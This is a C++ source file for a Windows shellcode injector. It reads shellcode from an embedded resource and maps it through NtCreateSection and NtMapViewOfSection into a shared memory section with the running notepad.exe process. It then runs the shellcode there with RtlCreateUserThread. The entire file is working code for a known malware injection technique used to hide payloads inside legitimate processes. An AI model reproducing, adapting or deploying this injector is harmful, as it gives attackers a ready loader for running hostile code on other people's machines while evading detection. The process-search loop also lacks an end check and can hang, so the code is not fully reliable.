#include"..\public.hpp"
#include<winternl.h>

typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *PCLIENT_ID;
using pNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
using pNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using pRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR  lpCmdLine, _In_ int  nCmdShow)
{
	//0.Get functions
	pNtCreateSection fNtCreateSection = (pNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
	pNtMapViewOfSection fNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
	pRtlCreateUserThread fRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
	//1.Get shellcode and shellcodesize from Resource by ID
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}
	//2.Get shellcode memory
	SIZE_T size = shellcodeSize;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (Process32First(snapshot, &processEntry))
	{
		while (_wcsicmp(processEntry.szExeFile, L"notepad.exe") != 0)
		{
			Process32Next(snapshot, &processEntry);
		}
	}
	DWORD targetPID = processEntry.th32ProcessID;
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
	memcpy(localSectionAddress, shellcode, shellcodeSize);
	//3.Execute shellcode
	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
	return 0;
}